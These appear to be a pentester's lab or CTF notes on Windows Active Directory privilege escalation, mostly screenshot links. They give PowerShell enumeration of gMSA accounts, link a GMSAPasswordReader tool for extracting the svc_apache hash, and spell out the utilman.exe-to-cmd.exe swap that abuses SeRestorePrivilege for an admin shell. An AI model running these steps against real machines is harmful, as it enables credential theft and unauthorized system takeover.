![Pasted image 20240619200604.png](Evidence/Pasted%20image%2020240619200604.png)

![Pasted image 20240619200755.png](Evidence/Pasted%20image%2020240619200755.png)

![Pasted image 20240619200919.png](Evidence/Pasted%20image%2020240619200919.png)

![Pasted image 20240619201151.png](Evidence/Pasted%20image%2020240619201151.png)

possible unquoted service exploit

![Pasted image 20240619201414.png](Evidence/Pasted%20image%2020240619201414.png)

Using the following PowerShell command, we can confirm that this account is a service account with GMSA enabled -> 
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```

![Pasted image 20240715205128.png](Evidence/Pasted%20image%2020240715205128.png)

to find info about which groups have permissions to retrieve the password for the svc_apache service account ->

```
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword
```

![Pasted image 20240715205113.png](Evidence/Pasted%20image%2020240715205113.png)

command to confirm if our user is a member of the Web Admins group just to be sure ->

```
Get-ADGroupMember "Web Admins"
```

![Pasted image 20240715205141.png](Evidence/Pasted%20image%2020240715205141.png)

https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe

![Pasted image 20240715211313.png](Evidence/Pasted%20image%2020240715211313.png)

the Current Value for rc4_hmac is the hash we need 

![Pasted image 20240715211556.png](Evidence/Pasted%20image%2020240715211556.png)

![Pasted image 20240715211733.png](Evidence/Pasted%20image%2020240715211733.png)

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#enable-all-the-tokens

To take advantage of the SeRestorePrivilge ->

1. Rename these two files
2. Then RDP into the machine `rdesktop $IP`
3. Then press WIN+u to spawn a admin shell

```
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
```
```
mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

![Pasted image 20240715212527.png](Evidence/Pasted%20image%2020240715212527.png)

![Pasted image 20240715212544.png](Evidence/Pasted%20image%2020240715212544.png)

![Pasted image 20240715212656.png](Evidence/Pasted%20image%2020240715212656.png)

